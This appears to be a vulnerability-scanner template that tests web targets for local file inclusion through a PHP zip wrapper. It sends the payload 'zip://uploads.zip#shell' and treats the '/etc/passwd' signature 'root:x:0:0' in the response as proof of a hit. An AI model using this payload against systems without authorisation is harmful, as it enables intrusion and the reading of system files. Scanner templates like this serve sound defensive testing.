id: lfi5-031
name: 'Wrapper zip via file'
severity: high
type: active
tags:
  - lfi
  - traversal
  - wrapper
description: 'Reads file via zip wrapper'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      file:
        - 'zip://uploads.zip#shell'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
